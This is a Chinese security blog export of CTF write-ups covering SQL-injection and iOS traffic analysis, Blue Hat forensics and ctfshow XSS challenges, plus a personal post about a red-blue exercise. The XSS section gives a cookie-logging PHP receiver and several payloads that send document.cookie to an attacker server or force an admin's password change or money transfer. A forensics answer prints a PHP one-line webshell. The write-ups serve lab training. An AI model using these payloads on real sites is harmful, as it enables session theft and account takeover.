<p>这种看起来可以防御CSRF攻击，因为它不具备CSRF存在的条件：网站不仅仅依赖于cookie进行会话处理，并且请求包含一个攻击者无法确定其值的参数。然而，有多种方法可以打破防御，所以还是有被CSRF攻击的可能。</p>
<p>还有很多具体的情况，ｂｐ靶场里也是有的。</p>
<p>CSRF还是很简单的，原理也比较好理解，具体绕过始终也离不开cookie，token，请求头之类的。</p>
]]></content>
      <tags>
        <tag>Web</tag>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>(陇剑杯 2021) SQL注入系列</title>
    <url>/2022/04/29/SQLflow/</url>
    <content><![CDATA[<h3 id="（1）"><a href="#（1）" class="headerlink" title="（1）"></a>（1）</h3><p>第一题，看SQL注入的语句，很明显是布尔盲注的特征</p>
<h3 id="（2）"><a href="#（2）" class="headerlink" title="（2）"></a>（2）</h3><p>这题更没劲，根据我的经验，流量分析倒着看就对了</p>
<blockquote>
<p>(select%20flag%20from%20sqli.flag),43,1)%20=%20’+’,1,(select%20table_name%20from%20information_schema.tables)</p>
</blockquote>
<p>数据库名#表名#字段名显而易见</p>
<h3 id="（3）"><a href="#（3）" class="headerlink" title="（3）"></a>（3）</h3><p>将日志导入excel，筛选返回长度479 480 481 482</p>
<p><img src="https://img-blog.csdnimg.cn/d893e06b2ded4f9f85d031d4fd2c7b7d.png"></p>
<p>然后再拿word替换一下，得到</p>
<p><img src="https://img-blog.csdnimg.cn/a24dd5c5e019430b8b986821ee2968a3.png"></p>
<p>flag{deddcd67-bcfd-487e-b940-1217e668c7db}</p>
<p>当然也可以写个脚本</p>
]]></content>
      <tags>
        <tag>wp</tag>
        <tag>flow</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>蓝帽杯_电子取证</title>
    <url>/2022/07/10/blue_hat/</url>
    <content><![CDATA[<p>第一次做这么多取证题，也是学到了很多东西</p>
<h3 id="手机取证"><a href="#手机取证" class="headerlink" title="手机取证"></a>手机取证</h3><h4 id="手机取证-1"><a href="#手机取证-1" class="headerlink" title="手机取证_1"></a>手机取证_1</h4><blockquote>
<p>  ​    现对一个苹果手机进行取证，请您对以下问题进行分析解答。</p>
<p>  ​    627604C2-C586-48C1-AA16-FF33C3022159.PNG图片的分辨率是？（答案参考格式：1920x1080）</p>
<p>  ​    附件下载地址见平台公告，解压密码为0ba6b2c094cbb3a04681a135487a19cb</p>
</blockquote>
<p>盘古阅读器打开，搜索一下题目中的图片，得到</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jDLvkT.png"></p>
<p>我们保存下来，看一下属性</p>
<p>得到分辨率</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jDOk0x.png"></p>
<h4 id="手机取证-2"><a href="#手机取证-2" class="headerlink" title="手机取证_2"></a>手机取证_2</h4><p>还是上题做法，我们搜一下单号</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jDODH0.png"></p>
<h3 id="计算机取证"><a href="#计算机取证" class="headerlink" title="计算机取证"></a>计算机取证</h3><h4 id="计算机取证-1"><a href="#计算机取证-1" class="headerlink" title="计算机取证_1"></a>计算机取证_1</h4><blockquote>
<p>  现对一个windows计算机进行取证，请您对以下问题进行分析解答。</p>
<p>  从内存镜像中获得taqi7的开机密码是多少？（答案参考格式：abcABC123）</p>
<p>  附件下载地址见平台公告，解压密码为93ce7ea39bdd7baa137f1e9b963b7ee5</p>
</blockquote>
<p>内存取证，来到强大的vol</p>
<p>详情见截图</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jr93Yq.png"></p>
<p>得到后，我们进行MD5解密</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jr9BkR.png"></p>
<h4 id="计算机取证-2"><a href="#计算机取证-2" class="headerlink" title="计算机取证_2"></a>计算机取证_2</h4><blockquote>
<p>  制作该内存镜像的进程Pid号是多少？（答案参考格式：1024）</p>
</blockquote>
<p>这次我们打开火眼</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jrCp90.png"></p>
<p>然后找到进程</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jrCVE9.png"></p>
<h4 id="计算机取证-3"><a href="#计算机取证-3" class="headerlink" title="计算机取证_3"></a>计算机取证_3</h4><blockquote>
<p>  bitlokcer分区某office文件中存在的flag值为？（答案参考格式：flag{abcABC123}）</p>
</blockquote>
<p>来到取证大师，用小工具解析出密钥</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jrkIQx.png" alt="https://s1.ax1x.com/2022/07/09/jrkIQx.png"></p>
<p>然后保存下来</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jrkjfA.png"></p>
<p>解开，得到两个office文件，全部导出</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jrAZpn.png"></p>
<p>再次套娃一层</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jrABAe.png"></p>
<p>我们还能发现pass.txt,打开是个字典，正好可以爆破</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jrVHmV.png"></p>
<p><img src="https://s1.ax1x.com/2022/07/09/jrEu8A.png"></p>
<h4 id="计算机取证-4"><a href="#计算机取证-4" class="headerlink" title="计算机取证_4"></a>计算机取证_4</h4><blockquote>
<p>  TrueCrypt加密中存在的flag值为？（答案参考格式：flag{abcABC123}）</p>
</blockquote>
<p>再回到vol</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jrmndf.png"></p>
<p>万物皆可binwalk</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jru3bq.png"></p>
<p>拿到了一坨压缩包，大致翻了翻，只有一个带密码的，好像有些东西</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jru0M9.png"></p>
<p>好像损坏了，由于手头只有修zip的工具，生改后缀，成功，爆破</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jrKFWF.png"></p>
<p>flag：<code>flag&#123;1349934913913991394cacacacacacc&#125;</code></p>
<h3 id="app取证"><a href="#app取证" class="headerlink" title="app取证"></a>app取证</h3><h4 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析_1"></a>程序分析_1</h4><blockquote>
<p>  现已获取某个APP程序，请您对以下问题进行分析解答。</p>
<p>  本程序包名是？（答案参考格式：abc.xx.de）</p>
<p>  <a href="https://pan.baidu.com/s/1VrweUuSf0UHoEKyvnEglWQ">附件下载</a> 提取码（GAME）<a href="https://share.weiyun.com/tZ3vmudB">备用下载</a></p>
</blockquote>
<p>打开我们的雷电工具，显而易见</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jrliJf.png"></p>
<h4 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析_2"></a>程序分析_2</h4><blockquote>
<p>  本程序的入口是？（答案参考格式：abc.xx.de）</p>
</blockquote>
<p>继续看</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jrl3SU.png"></p>
<p>得到<code>minmtta.hemjcbm.ahibyws.MainActivity</code></p>
<h4 id="程序分析-3"><a href="#程序分析-3" class="headerlink" title="程序分析_3"></a>程序分析_3</h4><blockquote>
<p>  本程序的服务器地址的密文是？（答案参考格式：abcABC123）</p>
</blockquote>
<p>反编译一下，拿到源码</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jrlhff.png"></p>
<p><code>aHR0cHM6Ly9hbnNqay5lY3hlaW8ueHl6</code></p>
<h4 id="程序分析-4"><a href="#程序分析-4" class="headerlink" title="程序分析_4"></a>程序分析_4</h4><blockquote>
<p>  本程序实现安全检测的类的名称是？（答案参考格式：abcABC123）</p>
</blockquote>
<p>继续顺一下我们的源码，安全检测，发现了相关源码</p>
<p><img src="https://s1.ax1x.com/2022/07/09/jr1KnH.png"></p>
<h3 id="网站取证"><a href="#网站取证" class="headerlink" title="网站取证"></a>网站取证</h3><h4 id="网站取证-1"><a href="#网站取证-1" class="headerlink" title="网站取证_1"></a>网站取证_1</h4><blockquote>
<p>  据了解，某网上商城系一团伙日常资金往来用，从2022年4月1日起使用虚拟币GG币进行交易，现已获得该网站的源代码以及部分数据库备份文件，请您对以下问题进行分析解答。</p>
<p>  请从网站源码中找出木马文件，并提交木马连接的密码。（答案参考格式：abcABC123）</p>
<p>  <a href="https://pan.baidu.com/s/1Z9pbTa18qP70-LQJq-S0qA">附件下载</a> 提取码（GAME）<a href="https://share.weiyun.com/x3wua9ys">备用下载</a></p>
</blockquote>
<p>下载附件，看一下，全是源码，咱们vsc打开翻一翻</p>
<p>然后挨着翻也就翻到了一句话木马</p>
<p><code>&lt;?php assert(@$_POST[&#39;lanmaobei666&#39;]); ?&gt;</code></p>
<p><img src="https://s1.ax1x.com/2022/07/09/jr178K.png"></p>
<h4 id="网站取证-2"><a href="#网站取证-2" class="headerlink" title="网站取证_2"></a>网站取证_2</h4><blockquote>
<p>  请提交数据库连接的明文密码。（答案参考格式：abcABC123）</p>
</blockquote>
<p><img src="https://s1.ax1x.com/2022/07/09/jrGNjO.png"></p>
<p>passwd指到了<code>my_encrypt()</code></p>
<p><img src="https://img-blog.csdnimg.cn/8cf1d0e79632443799ffc570e2e6b7d7.png"></p>
<p>根据源码得到解码脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">my_encrypt</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&#x27;P3LMJ4uCbkFJ/RarywrCvA==&#x27;</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;/r/n&quot;</span>, <span class="string">&quot;/r&quot;</span>, <span class="string">&quot;/n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&#x27;PanGuShi&#x27;</span>;</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$key</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">    <span class="variable">$td</span> = <span class="title function_ invoke__">mcrypt_module_open</span>(MCRYPT_RIJNDAEL_128,<span class="string">&quot;&quot;</span>,MCRYPT_MODE_CBC,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mcrypt_generic_init</span>(<span class="variable">$td</span>, <span class="string">&quot;PanGuShi&quot;</span>, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="variable">$decode</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$dencrypted</span> = <span class="title function_ invoke__">mdecrypt_generic</span>(<span class="variable">$td</span>, <span class="variable">$decode</span>);</span><br><span class="line">    <span class="title function_ invoke__">mcrypt_generic_deinit</span>(<span class="variable">$td</span>);</span><br><span class="line">    <span class="title function_ invoke__">mcrypt_module_close</span>(<span class="variable">$td</span>);</span><br><span class="line">    <span class="variable">$dencrypted</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$dencrypted</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$dencrypted</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">my_encrypt</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果<code>KBLT123</code></p>
<h4 id="网站取证-3"><a href="#网站取证-3" class="headerlink" title="网站取证_3"></a>网站取证_3</h4><blockquote>
<p>  请提交数据库金额加密混淆使用的盐值。（答案参考格式：abcABC123）</p>
</blockquote>
<p>还是翻源码，得到</p>
<p><img src="https://img-blog.csdnimg.cn/b2badf8b9054448d9bc19443ce6c99af.png"></p>
<p><code>function decrypt($data, $key = &#39;jyzg123456&#39;)</code></p>
]]></content>
      <tags>
        <tag>wp</tag>
        <tag>Forensics</tag>
        <tag>SkyMirror</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow_xss_wp</title>
    <url>/2022/05/14/ctfshow_xss_wp/</url>
    <content><![CDATA[<p>跨站脚本攻击在这一套题目中体现的淋漓尽致。</p>
<h3 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h3><p>跨站脚本攻击，现时跨站，这里我用的自己的服务器，当然也有用各种xss网站的，</p>
<p>都差不多，比如<a href="http://xsscom.com/%E5%8A%A0%E8%BD%BD%E7%9A%84%E8%BF%98%E6%AF%94%E8%BE%83%E5%BF%AB%E3%80%82">http://xsscom.com/加载的还比较快。</a></p>
<p>我用的自己服务器，贴上一个这个脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;1&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>, <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我这里建议文件名不要用xss，因为我刚开始用的xss，后边会有题目把xss过滤了。</p>
<p>payload：</p>
<p><code>&lt;script&gt;window.location.href=&#39;http://自己服务器IP/a.php?1=&#39;+document.cookie&lt;/script&gt;</code></p>
<p><code>window.location.href</code>可以理解成是，跳转到href里，具体参考<a href="https://www.cnblogs.com/Qian123/p/5345298.html#_label3">https://www.cnblogs.com/Qian123/p/5345298.html#_label3</a></p>
<p><code>document.cookie</code>就是创建一个cookie,这里是把目标cookie窃取下来，具体参考<a href="https://www.runoob.com/jsref/prop-doc-cookie.html">https://www.runoob.com/jsref/prop-doc-cookie.html</a></p>
<h3 id="web317-319"><a href="#web317-319" class="headerlink" title="web317-319"></a>web317-319</h3><p>这里属于是一招鲜吃遍天了，这里过滤的东西都不一样，有img，script，xss</p>
<p>但是payload:</p>
<p><code>&lt;body onload=&quot;document.location.href=&#39;http://IP/a.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt;</code></p>
<p>无敌</p>
<h3 id="web320-web326"><a href="#web320-web326" class="headerlink" title="web320-web326"></a>web320-web326</h3><p>过滤了空格，但是tab或者/或者/**/都可以用</p>
<p>所以payload:</p>
<p><code>&lt;body/onload=&quot;document.location.href=&#39;http://ip/a.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt;</code></p>
<h3 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h3><p>开始来到存储型XSS，难度起来了。</p>
<p>这题注意收件人要是admin</p>
<p>然后信的内容还是老样子</p>
<p><code>&lt;body/**/onload=&quot;document.location.href=&#39;http://ip/a.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt;</code></p>
<h3 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h3><p>这题打开会发现貌似没有传xss payload的地方，但是细心的同学会发现</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111644982.png"></p>
<p>也就是说，如果我们是admin，说不定就拿到flag了，那咱们有了admin的cookie，是不是就能伪装成admin呢</p>
<p>那么还是怎么传payload的问题，密码为啥不能是payload，注册就拿到cookie了</p>
<p>这题body不能用了，返璞归真，用script</p>
<p><code>&lt;script&gt;document.location.href=&#39;http://ip/a.php?1=&#39;+document.cookie;&lt;/script&gt;</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111644636.png"></p>
<p>如果你很不幸x到了自己，出了多个sessionid，那么就选最后一个</p>
<p>然后抓包，改个cookie就OK</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111645031.png"></p>
<h3 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h3><p>在这个例子中，admin的sessionid每次会话都会变，所以没办法使用sessionid进行登录（机器人好像设置的是上去一下就下来），那么思路就是让注入的XSS Payload自动读取本页面的带有<code>ctfshow</code>的字段并发到vps上。<br> 注册一个普通账号并登录，修改一个显示密码的地方为<code>ctfshow&#123;123456&#125;</code>，然后尝试直接在console中将这段字段读出来并发送到vps中，使用jQuery的类选择器：</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111645031.png"></p>
<p>群主就根据这个东西写出来了payloa</p>
<p><code>&lt;script&gt;$(&#39;.laytable-cell-1-0-1&#39;).each(function(index,value)&#123;if(value.innerHTML.indexOf(&#39;ctf&#39;+&#39;show&#123;&#39;)&gt;-1)&#123;window.location.href=&#39;http://ip/a.php?1=&#39;+value.innerHTML;&#125;&#125;);&lt;/script&gt;</code></p>
<p>还是拿这个当作密码，就可以了。</p>
<h3 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h3><p>上来先试一梭子上一题的payload，好像并没有成功。</p>
<p>继续看这题多了个修改密码界面，那么只要让管理员修改成我们知道的密码，就能解决了</p>
<p>x到管理员，还是得走我们的密码。先抓个包看看改密码的api</p>
<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111647725.png" style="zoom:67%;" />

<p><code>&lt;script&gt;window.location.href=&#39;http://127.0.0.1/api/change.php?p=123&#39;;&lt;/script&gt;</code></p>
<p>这里的由于x的是admin，所以用了admin的本地IP<code>127.0.0.1</code></p>
<p>注册，发现并没有什么用，试试用户名，你看那用户名，很长一筐，其实之前一直没用用户名，是因为用户名只能注册一次，但是密码可以重复</p>
<p>或者保险起见，直接用户名密码全是xss</p>
<p>好了，admin#123 登陆成功，为了防止自动跳转，这里抓一下</p>
<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111647186.png" style="zoom:67%;" />

<h3 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h3><p>上来，先试一试上一题的payload，好吧，并没有那么幸运</p>
<p>这里注意到url，发现并不是get了，那么猜测是post，抓包一看，果然是</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111657280.png"></p>
<p>仿照，post的源码，写个payload就好了</p>
<img src="https://img-blog.csdnimg.cn/2374b981265e47b0937e36cfe3e3422b.png" style="zoom:67%;" />

<p><code>&lt;script&gt;$.ajax(&#123;url:&#39;api/change.php&#39;,type:&#39;post&#39;,data:&#123;p:&#39;123&#39;&#125;&#125;);&lt;/script&gt;</code></p>
<p>payload来喽，解决</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111656980.png"></p>
<h3 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h3><p>先试一下上一题的payload，就是说，只要拿到admin了，什么都好说，然后失败了，转换思路。</p>
<p>这题很简单，要买flag嘛，但是钱不够，还有个转账口子</p>
<p>尝试转负的，然后就成功了</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111654005.png"></p>
<p>购买flag，成功</p>
<p>这题也可以给自己转账，然后会发现，给自己转账是不要钱的，然后就可以一直转，只要金额少于自己的余额就行。</p>
<p>这里就不再演示了。</p>
<p>然后这好像跟xss没什么关系，现在x不到admin的密码了，我们试一试能不能直接x一下admin转账，我们抓包看一下转账的传参</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111654665.png"></p>
<p>改一下上一题的payload</p>
<p><code>&lt;script&gt;$.ajax(&#123;url:&#39;api/amount.php&#39;,type:&#39;post&#39;,data:&#123;u:&#39;123&#39;,a:&#39;10000&#39;&#125;&#125;);&lt;/script&gt;</code></p>
<p>搞定啊</p>
<h3 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h3><p>首先试一试上一题，给自己转账是可行的，x到admin转账也是可行的。</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111647124.png"></p>
<p><code>&lt;script&gt;$.ajax(&#123;url:&#39;api/amount.php&#39;,type:&#39;post&#39;,data:&#123;u:&#39;123&#39;,a:&#39;10000&#39;&#125;&#125;);&lt;/script&gt;</code></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>js很重要，可以通过js搞整个网页</p>
]]></content>
      <tags>
        <tag>Web</tag>
        <tag>XSS</tag>
        <tag>wp</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>闲聊——第一次HW</title>
    <url>/2022/08/10/hw01/</url>
    <content><![CDATA[<p>我很幸运，参加了2022的国家hw行动，7.24-8.8 历时十五天，结交了一些圈内大佬</p>
<p>说实话，hw很难学到一些技术性知识，就算有，也是摸鱼时闲着没事自学的，还有就是一些安全设备使用，幸运的话，可以学一些研判甚至是溯源相关的知识。</p>
<p>hw最主要就是结实一些圈内大佬，去大城市看看，与各个厂商大佬交流，见见世面，当然可以捞一波💴，但是一定要小心，不要被黑心中介骗了。</p>
<p>这次hw，说的最多的一句话是：<code>“这🐕上海，🐕都不来，真不是人活的”</code></p>
<p>外地人在上海是真的难活，特别是一般的打工人，这边的物价是真要命，而且一辈子也买不起上海的一套房。</p>
<p>一个月房租就要2k+，每顿饭也得20+，一块油饼就要八九块，一碗豆花也要八九块</p>
<p>不过我在这边活得还是比较滋润的，因为是包差旅嘛，我就需要吃个饭花钱，而且公司还给提供吃不完的零食饮料，前几天一天还点两顿外卖，因为我是夜班嘛，就下班吃一顿，上班前吃一顿。到了后边公司零食越来越丰盛，每天就吃一顿。一般是半夜吃，然后早上吃个泡面或者小面包啥的。</p>
<p>可以晒一下我吃的东西</p>
<p>这是吃的一些泡面，自热米饭之类的</p>
<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208152007211.jpg" style="zoom:25%;" />

<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208152007221.jpg" style="zoom:25%;" />

<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208152007220.jpg" style="zoom:25%;" />

<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208152007216.jpg" style="zoom:25%;" />

<p>这一份在我们门口摆放了好久，也没人吃，好像是甲方那边的，也只有我一个人吃过，感觉还不错</p>
<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208152007219.jpg" style="zoom:25%;" />

<p>后边是一些日常的零食，饮料，以及人生第一瓶百岁山</p>
<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208152015411.jpg" style="zoom:25%;" />

<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208152015412.jpg" style="zoom:25%;" />

<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208152015413.jpg" style="zoom:25%;" />

<p>在这边的工作是比较轻松的，每天刷刷微步，吃吃零食，做做巡检，看看告警</p>
<p>在微步上我们被称作YT，鼠标猴</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208152018820.jpg"></p>
<p>十五天很快，一会就过去了，这里引用微步的一段话</p>
<blockquote>
<p>明天之后，你我各归岗位。太阳照常升起，小王背着双肩包挤地铁，小李又在客户现场逢着一位心仪的姑娘。人来车往，岁月静好，一切如常。<br>海水冲刷沙滩，这十五天的一切，仿佛从来没发生过。但是某个时刻，也许你我会记起，我们曾共同在中国网络空间留下一页红蓝色的篇章，刻下攻与防的痕迹。<br>战斗是为了永久的和平。无论如何，世界已经因为这场不见硝烟的演习而永久性改变。<br>功成不必在我，功成必定有我。其中故事，我们来日再续。</p>
</blockquote>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208152025576.jpg"></p>
<p>这十五天，也有两个人，让我感到非常愧疚。</p>
<p>一位是7.30那天晚上冒雨为我送外卖的骑手，他因为送我的单，淋坏了自己的手机。那天晚上雨很大，我却无能为力。</p>
<p>还有一位就是她，和我异地了一年多的她，从高中同学变成情侣又变回了高中同学</p>
<p>7.27是她的生日，我在hw，8.4是七夕，我还在hw，8.5我们成为了高中同学</p>
]]></content>
      <tags>
        <tag>HW</tag>
        <tag>chat</tag>
      </tags>
  </entry>
  <entry>
    <title>(陇剑杯 2021)ios系列</title>
    <url>/2022/04/29/ios_flow/</url>
    <content><![CDATA[<h3 id="（1）"><a href="#（1）" class="headerlink" title="（1）"></a>（1）</h3><p>根据经验，没思路就追踪TCP流</p>
<p>追到15流，会发现一坨东西，翻一翻就能得到。</p>
<p><img src="https://s1.ax1x.com/2022/04/29/LxZCuV.png"></p>
<p>很明显，3.128.156.159</p>
<h3 id="（2）"><a href="#（2）" class="headerlink" title="（2）"></a>（2）</h3><p>还是刚刚追踪的TCP流</p>
<p><img src="https://s1.ax1x.com/2022/04/29/LxZpj0.png"></p>
<p>项目连接都摆出来了</p>
<blockquote>
<p><a href="https://github.com/ph4ntonn/Stowaway/">https://github.com/ph4ntonn/Stowaway/</a></p>
</blockquote>
<p>工具就是stowaway</p>
<h3 id="（3）"><a href="#（3）" class="headerlink" title="（3）"></a>（3）</h3><p>访问项目连接，翻一翻得到了</p>
<p><img src="https://s1.ax1x.com/2022/04/29/LxVx9s.png"></p>
<p>hack4sec就是密文了</p>
<h3 id="（4）"><a href="#（4）" class="headerlink" title="（4）"></a>（4）</h3><p>翻来覆去，并没有找到跟SQL注入有关的数据，但是看见了TLS加密的</p>
<p>解密（wireshark➡编辑➡首选项➡protocols）一下，看HTTP2发现了SQL注入的语句，存下来，然后把需要的数据筛选出来，这里我看花眼了，所以写了个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;1.txt&quot;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">indata = file.read()</span><br><span class="line">obj = re.<span class="built_in">compile</span>(<span class="string">r&quot;_from_user%29%3D%22(?P&lt;wahaha&gt;.*?)%22_then_id_else&quot;</span>,re.S)</span><br><span class="line">result = obj.finditer(indata)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> it <span class="keyword">in</span> result :</span><br><span class="line">    <span class="built_in">print</span>(it.group(<span class="string">&quot;wahaha&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>然后得到的数据，<a href="https://ctf.mzy0.com/CyberChef3/#recipe=From_Hex%EF%BC%8816%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%EF%BC%89('Auto')&input=MzcgMzQgMzYgMzUgMzUgMzggNjYgMzMgMkQgNjMgMzggMzQgMzEgMkQgMzQgMzUgMzYgNjIgMkQgMzggMzUgNjQgMzcgMkQgNjQgMzYgNjMgMzAgNjYgMzIgNjUgNjQgNjEgNjIgNjIgMzIg">hex解码</a>一下，就能得到</p>
<blockquote>
<p>746558f-c841-456b-85d7-d6c0f2edabb2</p>
</blockquote>
<h3 id="（5）"><a href="#（5）" class="headerlink" title="（5）"></a>（5）</h3><p>两种办法，第一种很笨，就是用wireshark过滤，借助</p>
<blockquote>
<p>tcp.port == n</p>
</blockquote>
<p>发现10-499是有数据的</p>
<p><img src="https://s1.ax1x.com/2022/04/29/LxZScq.png"></p>
<p><img src="https://s1.ax1x.com/2022/04/29/LxVz3n.png"></p>
<p>第二种参考了雪殇的wp，<a href="https://www.cnblogs.com/wongbingming/p/13212306.html">TCP dump</a>一下</p>
<blockquote>
<p>tcpdump -n -r triffic.pcap | awk ‘{print $3}’ | sort -u &gt; ou1t.txt</p>
</blockquote>
<p><img src="https://s1.ax1x.com/2022/04/29/LxZiHU.png"></p>
<h3 id="（7）"><a href="#（7）" class="headerlink" title="（7）"></a>（7）</h3><p>看一眼access.log,很明显</p>
<p><img src="https://s1.ax1x.com/2022/04/29/LxZkEF.png"></p>
<p>再结合（4）或者（5）都能得到192.168.1.12</p>
<h3 id="（8）"><a href="#（8）" class="headerlink" title="（8）"></a>（8）</h3><p>看日志，明显。</p>
<p><img src="https://s1.ax1x.com/2022/04/29/LxZPBT.png"></p>
<p>webshell特征，所以密码为fxxk</p>
]]></content>
      <tags>
        <tag>wp</tag>
        <tag>flow</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>Misc_流量分析_基础</title>
    <url>/2022/06/17/misc_flow/</url>
    <content><![CDATA[<p>不能鸽了，从考试周，鸽到现在，新建文件夹半个月了，今天必写出来</p>
<p>开始咱们先说点流量分析常见的题目。</p>
<h3 id="flag能直接找到"><a href="#flag能直接找到" class="headerlink" title="flag能直接找到"></a>flag能直接找到</h3><p>这部分题可能就难在谁有耐心吧，最简单的就是通过flag查找工具，直接找到flag，或者是通过常见编码后的flag</p>
<p>常见的有这几种</p>
<blockquote>
<p>#默认字符关键字<br>flag,666c6167,Zmxh,&amp;#102,464C4147</p>
<p>#默认正则关键字<br>flag{.+},666c6167\w+,Zmxh[\w=]+,&amp;#102.+</p>
<p>#其他关键字<br>key,ctf,f1ag,ffllaagg,f-l-a-g</p>
<p>#flag二进制格式<br>1100110011011000110000101100111</p>
<p>#正则编码类<br>key{.<em>},ctf{.</em>},f1ag{.*}</p>
<p>#正则匹配中文<br>[\u4E00-\u9FA5]+</p>
<p>#百里挑一正则<br>.[a-f1234567890]{17}}</p>
<p>#ip正则<br>\d+.\d+.\d+.\d+</p>
<p>#flag反写<br>{.*}galf</p>
<p>#安恒<br>dasctf</p>
<p>cyberpeace{.*} </p>
</blockquote>
<p>还有一些流量包东西很杂，一条条翻太慢了，可以在跑一下string，就一目了然</p>
<p>还有一些就是flag分段的，可能每个字母都在不同的包中，也可能分成了几段。</p>
<p>这一块中，比较难的就是编码不常见的，那玩意看见了都不一定能猜到那是flag，更何况他再藏得深一点，像第二届网刃杯的</p>
<p>ncsubj、xyp07和cryptolalia</p>
<p>这个xyp07很奇妙，拿科莱一跑就出来了。</p>
<p>cryptolalia非对称加密，这个看出来需要一定的经验。</p>
